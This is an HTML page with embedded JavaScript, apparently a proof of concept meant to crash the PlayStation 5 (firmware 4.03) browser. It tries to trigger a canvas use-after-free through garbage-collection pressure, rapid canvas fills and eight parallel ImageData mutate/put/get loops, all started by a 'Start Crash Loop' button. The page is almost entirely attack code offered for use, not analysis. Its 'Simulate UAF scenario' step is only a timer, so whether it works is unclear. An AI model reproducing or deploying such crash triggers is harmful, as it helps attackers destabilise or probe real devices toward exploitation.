<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>PS5 4.03 Canvas UAF Crash Test</title>
  <style>
    body { font-family: monospace; background: #111; color: #eee; padding: 10px; }
    button { font-size: 16px; padding: 10px; }
    #log { margin-top: 10px; white-space: pre-wrap; background: #222; padding: 10px; border: 1px solid #444; max-height: 300px; overflow-y: auto; }
  </style>
</head>
<body>
  <h2>PS5 Canvas UAF / Crash Trigger</h2>
  <button onclick="startCrash()">Start Crash Loop</button>
  <div id="log"></div>
  <canvas id="canvas" width="512" height="512" style="display:none;"></canvas>

  <script>
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    const logDiv = document.getElementById('log');

    function log(msg) {
      logDiv.textContent += msg + "\n";
      logDiv.scrollTop = logDiv.scrollHeight;
    }

    function stressGC() {
      for (let i = 0; i < 1000; i++) {
        new ArrayBuffer(2 * 1024 * 1024);
      }
    }

    function mutateImageData(imageData) {
      const buf = new Uint8Array(imageData.data.buffer);
      for (let i = 0; i < buf.length; i += 4) {
        buf[i] = Math.random() * 255;     // R
        buf[i+1] = Math.random() * 255;   // G
        buf[i+2] = Math.random() * 255;   // B
        buf[i+3] = 255;                   // A
      }
    }

    function rapidAbuse(imageData) {
      let run = true;
      setTimeout(() => run = false, 10000); // Stop after 10s

      function loop() {
        if (!run) return;
        try {
          mutateImageData(imageData);
          ctx.putImageData(imageData, 0, 0);
          const img = ctx.getImageData(0, 0, 512, 512);
          const temp = new Uint8Array(img.data.buffer);
        } catch (e) {
          log("Exception: " + e.message);
        }
        setTimeout(loop, 0);
      }

      for (let i = 0; i < 8; i++) loop(); // Start multiple loops
    }

    async function startCrash() {
      log("Starting Canvas UAF crash attempt...");
      let refImageData = ctx.createImageData(512, 512);
      for (let i = 0; i < refImageData.data.length; i++) refImageData.data[i] = 0x41;

      stressGC();

      // Fill canvas repeatedly
      const drawInterval = setInterval(() => {
        ctx.fillStyle = `rgb(${Math.random()*255}, ${Math.random()*255}, ${Math.random()*255})`;
        ctx.fillRect(0, 0, 512, 512);
      }, 1);

      // Simulate UAF scenario
      setTimeout(() => {
        clearInterval(drawInterval);
        rapidAbuse(refImageData);
        log("Heap abuse started...");
      }, 2000);
    }
  </script>
</body>
</html>
